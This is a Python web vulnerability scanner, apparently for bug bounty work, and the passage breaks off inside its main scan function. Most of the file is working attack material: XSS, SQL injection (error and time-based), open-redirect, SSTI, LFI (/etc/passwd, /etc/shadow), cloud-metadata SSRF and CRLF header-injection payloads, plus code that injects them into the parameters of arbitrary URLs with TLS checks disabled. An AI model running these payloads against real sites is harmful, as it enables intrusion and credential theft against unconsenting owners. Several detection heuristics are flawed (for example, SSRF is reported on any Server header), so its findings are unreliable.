"""
Vulnerability Scanner Engine v2.0

Fixes from v1:
- Silent except:pass replaced with proper error handling
- SQLi false positive: length diff removed, only real error signatures
- Rate limiting fixed: throttle before submitting, not after
- Time-based SQLi now uses baseline subtraction
- XSS checks HTML-encoded reflection too
- Added: SSTI, LFI, Header Injection, IDOR, XXE hint detection
- Payload libraries expanded significantly
- Per-param deduplication so same vuln isn't reported 10x
"""

import re
import time
import urllib.parse
import html
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# =========================
# CONFIG
# =========================

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    )
}

REQUEST_TIMEOUT  = 8
TIME_SQLI_DELAY  = 5      # seconds to wait for time-based SQLi
MAX_WORKERS      = 15     # reduced from 30 — be less aggressive
RATE_LIMIT_DELAY = 0.15   # seconds between submitting each URL's tests

# Static file extensions to skip
SKIP_EXTENSIONS = {
    ".js", ".css", ".png", ".jpg", ".jpeg",
    ".gif", ".svg", ".woff", ".woff2", ".ttf",
    ".ico", ".pdf", ".zip", ".mp4", ".webp",
}

# Params that are never worth testing
NOISE_PARAMS = {
    "lang", "language", "locale", "theme", "color",
    "utm_source", "utm_medium", "utm_campaign", "utm_term",
    "ref", "referrer", "fbclid", "gclid", "_ga",
    "format", "output", "callback",  # jsonp - separate test needed
}


# =========================
# PAYLOAD LIBRARIES
# =========================

XSS_PAYLOADS = [

    # Basic
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "\"'><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",

    # SVG
    "<svg/onload=alert(document.domain)>",
    "<svg><script>alert(1)</script></svg>",

    # Attribute breakout
    "\" autofocus onfocus=alert(1) x=\"",
    "' autofocus onfocus=alert(1) x='",

    # HTML Injection
    "<h1>XSS</h1>",

    # URL
    "javascript:alert(1)",

    # Event handlers
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",

    # Template contexts
    "{{7*7}}",
    "${7*7}",
]

XSS_ENCODED_VARIANTS = [
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
]

# Signatures to look for in XSS responses
XSS_REFLECTION_PATTERNS = [

    "<script",
    "</script>",
    "<svg",
    "<img",
    "<iframe",

    "onerror=",
    "onload=",
    "onfocus=",

    "javascript:",

    "&lt;script",
    "&#60;script",
    "%3cscript",

]

SQLI_ERROR_PAYLOADS = [

    # Quote breaking
    "'",
    "\"",
    "'))",
    "';",
    "\";",

    # Boolean
    "' OR '1'='1'-- -",
    "' OR 1=1-- -",
    "\" OR \"1\"=\"1\"-- -",
    "' AND '1'='2'-- -",
    "\" AND \"1\"=\"2\"-- -",

    # UNION
    "' UNION SELECT NULL-- -",
    "' UNION SELECT 1-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",

    # ORDER BY
    "' ORDER BY 1-- -",
    "' ORDER BY 5-- -",
    "' ORDER BY 100-- -",

    # DB fingerprint
    "' AND version()-- -",
    "' UNION SELECT @@version-- -",
    "' UNION SELECT sqlite_version()-- -",

    # Error forcing
    "'||(SELECT 1/0)||'",
    "' AND extractvalue(1,concat(0x7e,user()))-- -",
]

SQL_ERROR_SIGNATURES = [

    # MySQL
    "sql syntax",
    "mysql",
    "mysqli",
    "mysql_fetch",
    "mysql_num_rows",
    "supplied argument",

    # PostgreSQL
    "postgresql",
    "pg_query",
    "pg_fetch",
    "syntax error at or near",

    # SQLite
    "sqlite",
    "sqlite3",

    # MSSQL
    "sql server",
    "microsoft ole db",
    "odbc sql server",

    # Oracle
    "ora-",
    "oracle",

    # Generic
    "database error",
    "query failed",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "fatal database error",
]

DATABASE_SIGNATURES = {

    "MySQL": [
        "mysql",
        "mysqli",
        "mysql_fetch",
        "supplied argument",
    ],

    "PostgreSQL": [
        "postgresql",
        "pg_query",
        "pg_fetch",
        "syntax error at or near",
    ],

    "SQLite": [
        "sqlite",
        "sqlite3",
    ],

    "Oracle": [
        "ora-",
        "oracle",
    ],

    "MSSQL": [
        "sql server",
        "microsoft ole db",
        "odbc sql server",
    ],

}

TIME_SQLI_PAYLOADS = [
    "' OR SLEEP(5) -- -",
    "1; WAITFOR DELAY '0:0:5' -- -",    # MSSQL
    "' OR pg_sleep(5) -- -",            # PostgreSQL
    "' AND SLEEP(5) -- -",
    "1' AND SLEEP(5) AND '1'='1",
]

REDIRECT_PAYLOADS = [

    # Absolute
    "https://evil.com",
    "http://evil.com",

    # Protocol-relative
    "//evil.com",

    # Encoded
    "https:%2f%2fevil.com",
    "https://evil.com%2F",
    "https://evil.com%252F",

    # Username confusion
    "https://evil.com@target.com",

    # Backslash tricks
    "https:\\evil.com",
    "\\\\evil.com",

    # Mixed slash
    "/\\evil.com",

    # Double slash
    "////evil.com",

    # URL encoded
    "%68%74%74%70%73://evil.com",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{7*7}",
    "{{config}}",
    "@(7*7)",
]

SSTI_DETECTION = [
    "49",           # 7*7
    "{{config}}",
    "RuntimeError",
    "jinja2",
    "template",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "../../../../etc/shadow",
    "../../../../windows/system32/drivers/etc/hosts",
    "/proc/self/environ",
]

LFI_DETECTION = [
    "root:x:0:0",
    "root:*:0:0",
    "/bin/bash",
    "/bin/sh",
    "[boot loader]",        # Windows
    "localhost",
    "/proc/self",
]

LFI_PARAMS = {
    "file", "path", "include", "page", "template",
    "doc", "document", "folder", "root", "pg",
    "style", "pdf", "layout", "conf", "config",
}

SSRF_PAYLOADS = [

    # AWS
    "http://169.254.169.254/latest/meta-data/",

    # GCP
    "http://metadata.google.internal/",

    # Azure
    "http://169.254.169.254/metadata/instance",

    # Localhost
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",

    # Internal ranges
    "http://10.0.0.1/",
    "http://192.168.0.1/",
    "http://172.16.0.1/",

    # DNS
    "http://localhost.localdomain/",
]

SSRF_PARAMS = {
    "url", "endpoint", "host", "dest", "target",
    "proxy", "fetch", "src", "source", "uri",
    "redirect", "link", "href",
}

SSRF_DETECTION = [

    # AWS
    "ami-id",
    "instance-id",
    "iam/security-credentials",
    "security-credentials",
    "instance-type",

    # Azure
    "metadata/instance",
    "compute",
    "subscriptionId",

    # GCP
    "computeMetadata",
    "metadata.google",

    # Alibaba
    "latest/meta-data",

    # DigitalOcean
    "droplet-id",

    # OpenStack
    "openstack",

    # Internal services
    "127.0.0.1",
    "localhost",
    "internal",
    "internal server",
    "private",
    "root:x:0:0",

    # Kubernetes
    "kubernetes",
    "kube-system",
    "serviceaccount",

]

HEADER_INJECTION_PAYLOADS = [
    "\r\nX-Injected: header",
    "\r\nSet-Cookie: injected=1",
    "%0d%0aX-Injected: header",
    "%0aX-Injected: header",
]


# =========================
# HELPERS
# =========================

def safe_request(
    url,
    timeout=REQUEST_TIMEOUT,
    allow_redirects=True,
    method="GET",
    data=None,
    headers=None,
):
    """
    Central request helper.
    Handles retries, redirects, gzip,
    SSL failures and connection errors.
    """

    session = requests.Session()

    final_headers = HEADERS.copy()

    if headers:
        final_headers.update(headers)

    for attempt in range(3):

        try:

            if method == "POST":

                return session.post(
                    url,
                    headers=final_headers,
                    timeout=timeout,
                    verify=False,
                    allow_redirects=allow_redirects,
                    data=data,
                )

            return session.get(
                url,
                headers=final_headers,
                timeout=timeout,
                verify=False,
                allow_redirects=allow_redirects,
            )

        except (
            requests.exceptions.Timeout,
            requests.exceptions.ConnectionError,
            requests.exceptions.ChunkedEncodingError,
            requests.exceptions.SSLError,
        ):

            if attempt == 2:
                return None

            time.sleep(0.5)

        except Exception:
            return None

    return None


def get_baseline(url):
    """Get baseline response for comparison. Returns (text, status, headers) or None."""
    res = safe_request(url)
    if res is None:
        return None
    return {
        "text": res.text,
        "status": res.status_code,
        "length": len(res.text),
        "headers": dict(res.headers),
        "content_type": res.headers.get("Content-Type", ""),
        "title": re.search(
            r"<title>(.*?)</title>",
            res.text,
            re.I | re.S
        ).group(1).strip()
        if "<title" in res.text.lower()
        else "",
    }


def inject_payload(url, param, payload):
    """Inject a payload into a specific parameter of a URL."""
    parsed    = urllib.parse.urlparse(url)
    query     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    query[param] = [payload]
    new_query = urllib.parse.urlencode(
        query,
        doseq=True,
        safe="/:@"
    )
    return parsed._replace(query=new_query).geturl()


def should_skip_url(url):

    parsed = urllib.parse.urlparse(url)

    lower = parsed.path.lower()

    if any(lower.endswith(ext) for ext in SKIP_EXTENSIONS):
        return True

    if "/static/" in lower:
        return True

    if "/assets/" in lower:
        return True

    if "/fonts/" in lower:
        return True

    if "/images/" in lower:
        return True

    if "/css/" in lower:
        return True

    if "/js/" in lower:
        return True

    return False

def get_testable_params(url):
    """
    Return interesting parameters ordered by bug bounty value.
    """

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(
        parsed.query,
        keep_blank_values=True
    )

    if not params:
        return []

    PARAM_SCORES = {

        # Critical
        "redirect":100,
        "url":100,
        "next":98,
        "return":98,
        "callback":96,

        "file":95,
        "path":95,
        "include":94,
        "template":94,

        "id":92,
        "userid":92,
        "uid":92,
        "account":90,
        "accountid":90,
        "user":90,

        "token":88,
        "apikey":88,
        "key":88,
        "auth":88,

        "search":85,
        "query":85,
        "q":85,

        "page":65,
        "lang":20,
        "locale":20,
        "theme":5,
    }

    scored = []

    for param in params:

        lower = param.lower()

        if lower in NOISE_PARAMS:
            continue

        score = PARAM_SCORES.get(lower,50)

        scored.append((param,score))

    scored.sort(
        key=lambda x:x[1],
        reverse=True
    )

    return [p for p,_ in scored]

def get_endpoint_profile(url):
    """
    Analyse an endpoint and determine which vulnerability
    classes are most relevant.
    """

    parsed = urllib.parse.urlparse(url)

    full = (
        parsed.path.lower() +
        "?" +
        parsed.query.lower()
    )

    profile = {

        "redirect": False,
        "xss": False,
        "sqli": False,
        "lfi": False,
        "ssrf": False,
        "idor": False,
        "ssti": False,

    }

    # Redirects
    if any(x in full for x in (
        "redirect",
        "return",
        "next",
        "callback",
        "url="
    )):
        profile["redirect"] = True

    # XSS
    if any(x in full for x in (
        "search",
        "query",
        "q=",
        "message",
        "comment"
    )):
        profile["xss"] = True

    # SQLi
    if any(x in full for x in (
        "id=",
        "user",
        "account",
        "product",
        "category"
    )):
        profile["sqli"] = True

    # LFI
    if any(x in full for x in (
        "file",
        "path",
        "include",
        "page",
        "template"
    )):
        profile["lfi"] = True

    # SSRF
    if any(x in full for x in (
        "url=",
        "host",
        "dest",
        "endpoint"
    )):
        profile["ssrf"] = True

    # IDOR
    if any(x in full for x in (
        "id=",
        "userid",
        "uid",
        "accountid"
    )):
        profile["idor"] = True

    # SSTI
    if any(x in full for x in (
        "template",
        "render",
        "view"
    )):
        profile["ssti"] = True

    return profile

# =========================
# ENDPOINT PROFILER
# =========================

def profile_endpoint(url, technologies=None):
    """
    Build an intelligence profile for an endpoint.
    Used to decide which tests are worth running.
    """

    if technologies is None:
        technologies = []

    parsed = urllib.parse.urlparse(url)

    path = parsed.path.lower()

    params = get_testable_params(url)

    tech_string = " ".join(
        t.lower()
        for t in technologies
    )

    profile = {

        "path": path,

        "params": params,

        "is_api":
            "/api/" in path
            or path.endswith("/api")
            or "graphql" in path,

        "is_login":
            any(x in path for x in (
                "login",
                "signin",
                "auth",
                "oauth"
            )),

        "is_admin":
            any(x in path for x in (
                "admin",
                "dashboard",
                "manage",
                "panel"
            )),

        "is_search":
            any(x in path for x in (
                "search",
                "query",
                "find"
            )),

        "is_file":
            any(x in path for x in (
                "file",
                "download",
                "upload",
                "document",
                "image"
            )),

        "is_user":
            any(x in path for x in (
                "user",
                "profile",
                "account",
                "member"
            )),

        "is_redirect":
            any(
                p.lower() in (
                    "redirect",
                    "next",
                    "return",
                    "url",
                    "callback"
                )
                for p in params
            ),

        "frameworks": tech_string,

    }

    return profile

# =========================
# TEST SCHEDULER
# =========================

def select_tests(profile):
    """
    Decide which vulnerability modules should run for an endpoint.
    """

    tests = []

    # -----------------------
    # XSS
    # -----------------------

    if profile["is_search"] or profile["is_user"]:
        tests.append(test_xss)

    # -----------------------
    # SQLi
    # -----------------------

    if (
        profile["is_api"]
        or profile["is_login"]
        or profile["is_user"]
    ):
        tests.append(test_sqli_error)

    # -----------------------
    # Redirect
    # -----------------------

    if profile["is_redirect"]:
        tests.append(test_open_redirect)

    # -----------------------
    # File related
    # -----------------------

    if profile["is_file"]:
        tests.append(test_lfi)

    # -----------------------
    # SSRF
    # -----------------------

    if profile["is_api"]:

        tests.append(test_ssrf)

    # -----------------------
    # SSTI
    # -----------------------

    frameworks = profile["frameworks"]

    if (
        "django" in frameworks
        or "flask" in frameworks
        or "jinja" in frameworks
        or "twig" in frameworks
        or "spring" in frameworks
    ):

        tests.append(test_ssti)

    # -----------------------
    # IDOR
    # -----------------------

    if profile["is_user"]:

        tests.append(test_idor_hints)

    # -----------------------
    # Header Injection
    # -----------------------

    tests.append(test_header_injection)

    # Remove duplicates

    seen = set()

    unique = []

    for fn in tests:

        if fn not in seen:

            unique.append(fn)

            seen.add(fn)

    return unique

# =========================
# PAYLOAD OPTIMIZER
# =========================

def optimize_payloads(profile, vuln_type):
    """
    Return the most relevant payloads for a vulnerability type
    based on endpoint profile and detected technologies.
    """

    frameworks = profile.get("frameworks", "").lower()

    payloads = []

    # ---------------------------------
    # XSS
    # ---------------------------------

    if vuln_type == "xss":

        payloads.extend(XSS_PAYLOADS)

        if "react" in frameworks:

            payloads += [
                "{alert(1)}",
                "</script><script>alert(1)</script>"
            ]

        if "angular" in frameworks:

            payloads += [
                "{{constructor.constructor('alert(1)')()}}"
            ]

        if "vue" in frameworks:

            payloads += [
                "{{this.constructor.constructor('alert(1)')()}}"
            ]

    # ---------------------------------
    # SQLi
    # ---------------------------------

    elif vuln_type == "sqli":

        payloads.extend(SQLI_ERROR_PAYLOADS)

        if "mysql" in frameworks:
            payloads += [
                "' UNION SELECT @@version-- -"
            ]

        if "postgres" in frameworks:
            payloads += [
                "' UNION SELECT version()-- -"
            ]

        if "oracle" in frameworks:
            payloads += [
                "'||(SELECT banner FROM v$version)||'"
            ]

    # ---------------------------------
    # SSRF
    # ---------------------------------

    elif vuln_type == "ssrf":

        payloads.extend(SSRF_PAYLOADS)

        if profile["is_api"]:

            payloads += [
                "http://127.0.0.1:8080/",
                "http://localhost:8080/"
            ]

    # ---------------------------------
    # Redirect
    # ---------------------------------

    elif vuln_type == "redirect":

        payloads.extend(REDIRECT_PAYLOADS)

    # ---------------------------------
    # LFI
    # ---------------------------------

    elif vuln_type == "lfi":

        payloads.extend(LFI_PAYLOADS)

    # ---------------------------------
    # Remove duplicates
    # ---------------------------------

    return list(dict.fromkeys(payloads))
    
# =========================
# INDIVIDUAL TESTS
# =========================

def test_xss(url, baseline):
    """Advanced reflected XSS detection with context awareness."""

    findings = []

    params = get_testable_params(url)

    if not params or not baseline:
        return findings

    for param in params:

        found = False

        for payload in XSS_PAYLOADS:

            if found:
                break

            test_url = inject_payload(url, param, payload)

            res = safe_request(test_url)

            if res is None:
                continue

            ctype = res.headers.get(
                "Content-Type",
                ""
            ).lower()

            if "html" not in ctype:
                continue

            body = res.text

            decoded = html.unescape(body)

            lower = decoded.lower()

            confidence = 0
            context = "Unknown"

            # Exact payload reflection
            if payload.lower() in lower:

                confidence = 95
                context = "Exact Reflection"

            # Inside script tag
            elif (
                "<script" in lower
                and "alert(" in lower
            ):

                confidence = 90
                context = "Script Context"

            # Event handler
            elif (
                "onerror=" in lower
                or "onload=" in lower
                or "onfocus=" in lower
            ):

                confidence = 88
                context = "Event Handler"

            # Attribute breakout
            elif (
                "<svg" in lower
                or "<img" in lower
                or "<iframe" in lower
            ):

                confidence = 85
                context = "HTML Attribute"

            # Encoded reflection
            elif any(
                sig in body.lower()
                for sig in (
                    "&lt;script",
                    "&#60;script",
                    "%3cscript"
                )
            ):

                confidence = 65
                context = "Encoded Reflection"

            if confidence:

                findings.append({

                    "type":"Reflected XSS",

                    "url":test_url,

                    "param":param,

                    "payload":payload,

                    "severity":"High" if confidence >= 85 else "Medium",

                    "confidence":confidence,

                    "context":context,

                    "evidence":context,

                })

                found = True

    return findings


def test_sqli_error(url, baseline):
    """
    Advanced error-based SQL Injection detection with DB fingerprinting.
    """

    findings = []

    params = get_testable_params(url)

    if not params or not baseline:
        return findings

    baseline_status = baseline["status"]
    baseline_length = baseline["length"]

    DATABASE_SIGNATURES = {

        "MySQL": [
            "mysql",
            "mysqli",
            "sql syntax",
            "mysql_fetch",
            "mysql_num_rows",
        ],

        "PostgreSQL": [
            "postgresql",
            "pg_query",
            "pg_fetch",
            "syntax error at or near",
        ],

        "SQLite": [
            "sqlite",
            "sqlite3",
        ],

        "Oracle": [
            "ora-",
            "oracle",
        ],

        "MSSQL": [
            "sql server",
            "microsoft ole db",
            "odbc sql server",
        ]
    }

    for param in params:

        found = False

        for payload in SQLI_ERROR_PAYLOADS:

            if found:
                break

            test_url = inject_payload(
                url,
                param,
                payload
            )

            res = safe_request(test_url)

            if res is None:
                continue

            body = res.text.lower()

            database = "Unknown"

            evidence = None

            confidence = 0

            # -----------------------------
            # Fingerprint database
            # -----------------------------

            for db, signatures in DATABASE_SIGNATURES.items():

                for sig in signatures:

                    if sig in body:

                        database = db
                        evidence = sig
                        confidence = 95
                        break

                if confidence:
                    break

            # -----------------------------
            # Status code anomaly
            # -----------------------------

            if (
                confidence == 0
                and res.status_code != baseline_status
            ):

                confidence = 70
                evidence = f"Status changed {baseline_status}->{res.status_code}"

            # -----------------------------
            # Response length anomaly
            # -----------------------------

            if confidence == 0:

                diff = abs(
                    len(res.text) - baseline_length
                )

                if diff > 500:

                    confidence = 60
                    evidence = f"Length changed by {diff}"

            # -----------------------------
            # WAF detection
            # -----------------------------

            waf_words = (
                "access denied",
                "request blocked",
                "mod_security",
                "cloudflare",
                "imperva",
                "akamai",
            )

            if any(w in body for w in waf_words):

                confidence = max(confidence, 50)

            if confidence:

                findings.append({

                    "type":"SQL Injection",

                    "url":test_url,

                    "param":param,

                    "payload":payload,

                    "severity":"Critical",

                    "confidence":confidence,

                    "database":database,

                    "evidence":evidence,

                })

                found = True

    return findings


def test_sqli_time(url, baseline):
    """
    Advanced time-based blind SQLi detection with retry verification.
    """

    findings = []

    params = get_testable_params(url)

    if not params or not baseline:
        return findings

    # ----------------------------------
    # Stable baseline (median of 5)
    # ----------------------------------

    samples = []

    for _ in range(5):

        try:

            start = time.perf_counter()

            res = safe_request(
                url,
                timeout=15
            )

            if res:
                samples.append(
                    time.perf_counter() - start
                )

        except Exception:
            pass

    if len(samples) < 3:
        return findings

    samples.sort()

    baseline_time = samples[len(samples)//2]

    # ----------------------------------
    # Database-specific payloads
    # ----------------------------------

    payload_groups = {

        "MySQL": [
            "' AND SLEEP(5)-- -",
            "' OR SLEEP(5)-- -",
        ],

        "PostgreSQL": [
            "';SELECT pg_sleep(5)--",
            "'||pg_sleep(5)--",
        ],

        "MSSQL": [
            "';WAITFOR DELAY '0:0:5'--",
        ],

        "Oracle": [
            "'||(SELECT DBMS_LOCK.SLEEP(5) FROM dual)||'",
        ],

        "Generic": TIME_SQLI_PAYLOADS,
    }

    payloads = []

    for group in payload_groups.values():
        payloads.extend(group)

    for param in params[:3]:

        verified = False

        for payload in payloads:

            if verified:
                break

            test_url = inject_payload(
                url,
                param,
                payload
            )

            delays = []

            for _ in range(2):

                try:

                    start = time.perf_counter()

                    res = safe_request(
                        test_url,
                        timeout=20
                    )

                    if res:

                        delays.append(
                            time.perf_counter() - start
                        )

                except Exception:
                    pass

            if len(delays) < 2:
                continue

            avg_delay = sum(delays)/len(delays)

            delta = avg_delay - baseline_time

            if delta >= 4:

                confidence = min(
                    100,
                    int(80 + delta*3)
                )

                findings.append({

                    "type":"Blind SQL Injection (Time)",

                    "url":test_url,

                    "param":param,

                    "payload":payload,

                    "severity":"Critical",

                    "confidence":confidence,

                    "baseline":round(baseline_time,2),

                    "response_time":round(avg_delay,2),

                    "delay":round(delta,2),

                    "evidence":
                        f"Average delay {delta:.2f}s"

                })

                verified = True

    return findings


def test_open_redirect(url, baseline):
    """Test for open redirect vulnerabilities."""
    findings = []
    params   = get_testable_params(url)

    if not params or not baseline:
        return findings

    # Prioritize redirect-related params but test all
    redirect_params = [
        p for p in params
        if any(x in p.lower() for x in
               ["redirect", "url", "next", "return", "callback",
                "goto", "dest", "target", "redir", "continue"])
    ]
    other_params = [p for p in params if p not in redirect_params]
    ordered_params = sorted(

        params,

        key=lambda p: (

            "redirect" not in p.lower(),

            "url" not in p.lower(),

            "next" not in p.lower(),

            "return" not in p.lower(),

            "callback" not in p.lower(),

            "continue" not in p.lower(),

            len(p)

        )

    )[:6]

    for param in ordered_params:

        found_for_param = False

        # Select payloads based on parameter name
        payloads = REDIRECT_PAYLOADS

        if "callback" in param.lower():
            payloads = REDIRECT_PAYLOADS[:4]

        elif "next" in param.lower():
            payloads = REDIRECT_PAYLOADS[:6]

        elif "return" in param.lower():
            payloads = REDIRECT_PAYLOADS[:6]

        elif "redirect" in param.lower():
            payloads = REDIRECT_PAYLOADS

        elif "url" in param.lower():
            payloads = REDIRECT_PAYLOADS

        for payload in payloads:

            if found_for_param:
                break

            test_url = inject_payload(url, param, payload)

            res = safe_request(
                test_url,
                allow_redirects=False
            )

            if res is None:
                continue

            location = res.headers.get("Location", "")

            location_lower = location.lower()

            redirected = False

            # -------------------------
            # HTTP Redirect
            # -------------------------

            if (
                res.status_code in (301,302,303,307,308)
                and (
                    "evil.com" in location_lower
                    or location_lower.startswith("//evil")
                    or location_lower.startswith("http://evil")
                    or location_lower.startswith("https://evil")
                )
            ):
                redirected = True


            # -------------------------
            # JavaScript Redirect
            # -------------------------

            body = res.text.lower()

            js_patterns = [

                "window.location",

                "location.href",

                "location.replace",

                "document.location",

                "window.location.href",

            ]

            if not redirected:

                if any(p in body for p in js_patterns):

                    if "evil.com" in body:

                        redirected = True


            # -------------------------
            # Meta Refresh
            # -------------------------

            if not redirected:

                if (
                    "http-equiv=\"refresh\"" in body
                    or "http-equiv='refresh'" in body
                ):

                    if "evil.com" in body:

                        redirected = True


            if redirected:

                findings.append({

                    "type": "Open Redirect",

                    "url": test_url,

                    "param": param,

                    "payload": payload,

                    "severity": "High",

                    "confidence": 95,

                    "evidence": location if location else "Client-side redirect"

                })

                found_for_param = True

    return findings


def test_ssti(url, baseline):
    """Test for Server-Side Template Injection."""
    findings = []
    params   = get_testable_params(url)

    if not params or not baseline:
        return findings

    for param in params:
        found_for_param = False

        for payload in SSTI_PAYLOADS:
            if found_for_param:
                break

            test_url = inject_payload(url, param, payload)
            res      = safe_request(test_url)

            if res is None:
                continue

            # Look for evaluated output (49 = 7*7)
            for sig in SSTI_DETECTION:
                if sig in res.text and sig not in baseline["text"]:
                    findings.append({
                        "type":     "SSTI (Server-Side Template Injection)",
                        "url":      test_url,
                        "param":    param,
                        "payload":  payload,
                        "severity": "Critical",
                        "evidence": f"Detected signature: {sig}",
                    })
                    found_for_param = True
                    break

    return findings


def test_lfi(url, baseline):
    """Test for Local File Inclusion."""
    findings = []
    params   = get_testable_params(url)

    if not params or not baseline:
        return findings

    # Only test params that look file-related
    target_params = [
        p for p in params
        if p.lower() in LFI_PARAMS or
        any(x in p.lower() for x in ["file", "path", "page", "include", "doc"])
    ]

    if not target_params:
        return findings

    for param in target_params:
        found_for_param = False

        for payload in LFI_PAYLOADS:
            if found_for_param:
                break

            test_url = inject_payload(url, param, payload)
            res      = safe_request(test_url)

            if res is None:
                continue

            for sig in LFI_DETECTION:
                if sig in res.text and sig not in baseline["text"]:
                    findings.append({
                        "type":     "Local File Inclusion",
                        "url":      test_url,
                        "param":    param,
                        "payload":  payload,
                        "severity": "High",
                        "evidence": f"File content signature detected: {sig}",
                    })
                    found_for_param = True
                    break

    return findings


def test_ssrf(url, baseline):
    """
    Advanced SSRF detection with cloud metadata awareness.
    """

    findings = []

    params = get_testable_params(url)

    if not params or not baseline:
        return findings

    priority = []

    for p in params:

        lower = p.lower()

        if (
            lower in SSRF_PARAMS
            or any(x in lower for x in (
                "url",
                "uri",
                "host",
                "domain",
                "dest",
                "redirect",
                "proxy",
                "callback",
                "image",
                "avatar",
                "feed",
                "fetch",
                "link",
                "endpoint",
            ))
        ):
            priority.append(p)

    if not priority:
        return findings

    priority.sort(
        key=lambda p: (
            "url" not in p.lower(),
            "host" not in p.lower(),
            "proxy" not in p.lower(),
            "endpoint" not in p.lower(),
        )
    )

    for param in priority:

        confirmed = False

        for payload in SSRF_PAYLOADS:

            if confirmed:
                break

            test_url = inject_payload(
                url,
                param,
                payload
            )

            res = safe_request(
                test_url,
                timeout=12,
                allow_redirects=True
            )

            if res is None:
                continue

            body = res.text.lower()

            confidence = 0
            evidence = ""

            # Metadata fingerprints
            for sig in SSRF_DETECTION:

                if sig.lower() in body:

                    confidence = 95
                    evidence = sig
                    break

            # Large response anomaly
            if confidence == 0:

                if abs(len(res.text) - baseline["length"]) > 1000:

                    confidence = 70
                    evidence = "Large response difference"

            # Server header changed
            if confidence == 0:

                server = res.headers.get("Server","")

                if server:

                    confidence = 60
                    evidence = f"Server: {server}"

            if confidence:

                findings.append({

                    "type":"SSRF",

                    "url":test_url,

                    "param":param,

                    "payload":payload,

                    "severity":"High",

                    "confidence":confidence,

                    "evidence":evidence,

                })

                confirmed = True

    return findings


def test_header_injection(url, baseline):
    """Test for HTTP header injection via URL parameters."""
    findings = []
    params   = get_testable_params(url)

    if not params or not baseline:
        return findings

    for param in params[:5]:
        for payload in HEADER_INJECTION_PAYLOADS[:2]:
            test_url = inject_payload(url, param, payload)
            res      = safe_request(test_url)

            if res is None:
                continue

            # Check if injected header appears in response headers
            if "X-Injected" in res.headers or "injected" in str(res.headers).lower():
                findings.append({
                    "type":     "HTTP Header Injection",
                    "url":      test_url,
                    "param":    param,
                    "payload":  payload,
                    "severity": "Medium",
                    "evidence": "Injected header reflected in response",
                })
                break

    return findings


def test_idor_hints(url, baseline):
    """
    Detect IDOR opportunities by finding numeric/UUID params
    and testing adjacent ID access. Not a full IDOR test —
    that requires two accounts — but flags candidates.
    """
    findings = []
    parsed   = urllib.parse.urlparse(url)
    params   = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    id_params = [
        p for p in params
        if any(x in p.lower() for x in
               ["id", "uid", "user_id", "account_id", "doc_id", "order_id", "object"])
        and params[p][0].isdigit()
    ]

    for param in id_params:
        original_val = int(params[param][0])

        for test_val in [original_val + 1, original_val - 1, 1, 0]:
            if test_val < 0:
                continue

            test_url = inject_payload(url, param, str(test_val))
            res      = safe_request(test_url)

            if res is None:
                continue

            # Flag if different response returned (suggests object exists)
            if (
                res.status_code == 200
                and baseline
                and res.text != baseline["text"]
                and len(res.text) > 100
            ):
                findings.append({
                    "type":     "Potential IDOR",
                    "url":      test_url,
                    "param":    param,
                    "payload":  str(test_val),
                    "severity": "Medium",
                    "evidence": f"Different response for {param}={test_val} vs {param}={original_val}",
                })
                break  # One candidate per param

    return findings


# =========================
# PER-URL TEST RUNNER
# =========================

def test_url(url, technologies=None):

    if technologies is None:
        technologies = []
    """
    Run all vulnerability tests against a single URL.
    Returns list of findings.
    """
    if should_skip_url(url):
        return []

    params = get_testable_params(url)
    if not params:
        return []

    # Get baseline once — reused by all tests
    baseline = get_baseline(url)
    if baseline is None:
        return []

    profile = profile_endpoint(
        url,
        technologies
    )

    path = profile["path"]

    all_findings = []

    tech_string = profile["frameworks"]

    test_functions = []

    test_functions = select_tests(profile)

    if not test_functions:

        test_functions = [

            test_xss,

            test_sqli_error,

            test_open_redirect,

        ]

    # Remove duplicate test functions
    unique_tests = []
    seen = set()

    for fn in test_functions:

        if fn in seen:
            continue

        seen.add(fn)
        unique_tests.append(fn)

    test_functions = unique_tests

    for test_fn in test_functions:
        try:
            results = test_fn(url, baseline)
            all_findings.extend(results)
        except Exception as e:
            # Log but don't crash — one test failing shouldn't kill the rest
            print(f"  [!] {test_fn.__name__} failed on {url[:50]}: {e}")
            continue

    return all_findings


# =========================
# TIME-BASED SEPARATE RUNNER
# (kept separate because it's slow — only runs on priority URLs)
# =========================

def test_url_timebased(url):
    """Run time-based SQLi test separately (slow, run on fewer URLs)."""
    if should_skip_url(url):
        return []

    params = get_testable_params(url)
    priority_params = [
        p for p in params
        if any(x in p.lower() for x in (
            "id",
            "user",
            "uid",
            "account",
            "search",
            "query",
            "q",
            "page",
            "sort",
            "filter"
        ))
    ]

    other_params = [p for p in params if p not in priority_params]

    params = priority_params + other_params

    baseline = get_baseline(url)
    if baseline is None:
        return []

    try:
        return test_sqli_time(url, baseline)
    except Exception as e:
        print(f"  [!] Time-based SQLi failed on {url[:50]}: {e}")
        return []


# =========================
# DEDUPLICATION
# =========================

def deduplicate(findings):
    """Remove duplicate findings by (type, url, param) key."""
    seen   = set()
    unique = []

    for f in findings:
        key = (
            f.get("type", ""),
            f.get("url", ""),
            f.get("param", ""),
        )
        if key not in seen:
            seen.add(key)
            unique.append(f)

    return unique


# =========================
# MAIN ENGINE
# =========================

def run_vuln_scan(urls, technologies=None):

    if technologies is None:
        technologies = {}
    """
